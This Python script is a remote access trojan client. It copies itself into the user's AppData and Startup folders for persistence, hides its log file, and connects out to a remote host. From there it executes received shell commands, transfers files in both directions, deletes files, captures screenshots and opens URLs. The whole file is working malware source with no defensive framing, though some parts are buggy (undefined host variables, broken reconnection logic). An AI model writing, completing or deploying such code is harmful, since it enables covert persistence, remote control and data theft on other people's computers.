import platform
import socket
import time
import subprocess
import json , shutil
import os , webbrowser
from mss import mss



def log(data , ERROR=False):
    def linux():
        if ERROR:
            with open("~/.logs.txt", "a+") as l:
                l.write(f"[Success] {data}\n")

        else:
            with open("~/.logs.txt", "a+") as l:
                l.write(f"[Failed] {data}\n")
    def windows():
        file = "logs.txt"
        hide_path = f"C:/Users/{os.getlogin()}/AppData/Roaming/"
        if ERROR:
            with open(hide_path+file, "a+") as l:
                l.write(f"[Success] {data}\n")

        else:
            with open(hide_path+file, "a+") as l:
                l.write(f"[Failed] {data}\n")


    if "Windows" in platform.platform():
        windows()
    else:
        linux()


def AddToStart():
    file_path = __file__
    hide_path = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft"
    startup_path = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    shutil.copy2(file_path, hide_path)
    shutil.copy2(file_path, startup_path)

try:
    AddToStart()
except:
    log("File can not be added to startup")
    pass


def screenshot():
    with mss() as sct:
        sct.shot()

def send_data(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def recv_data():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue


def connection(lhost ,lport):
    log("Connection established", True)
    os.system(f"attrib +h +x +s C:/Users/{os.getlogin()}/AppData/Roaming/logs.txt")
    while True:
        time.sleep(5)
        try:
            s.connect((lhost , lport))
            shell()
            s.close()
            break
        except:
            log("Something went wrong")
            connection()


def upload_file(file):
    f = open(file, 'rb')
    s.send(f.read())

def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
        s.settimeout(None)
        f.close()

def shell():
    while True:
        command = recv_data()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        elif command[:8] == 'download ':
            send_data(f"<:> Downloading... {command[9:]}")
            upload_file(command[9:])
        elif command[:6] == 'upload':
            send_data(f"<:> Uploading... {command[7:]}")
            download_file(command[7:])

        elif command[:3] == "rm ":
            os.remove(command[3:])
            send_data("[√] Directory Removed ")


        elif command == "screenshot":
            screenshot()
            send_data("[√] Screenshot Captured")
        elif command[:4] == "url ":
            send_data(f"<■> Opening {command[4:]}...")
            webbrowser.open(command[4:])
            send_data("[√] Done")
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                send_data(result)
            except:
                log(f"Command {command} not executed")
                continue


s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
connection(lhost , lport)
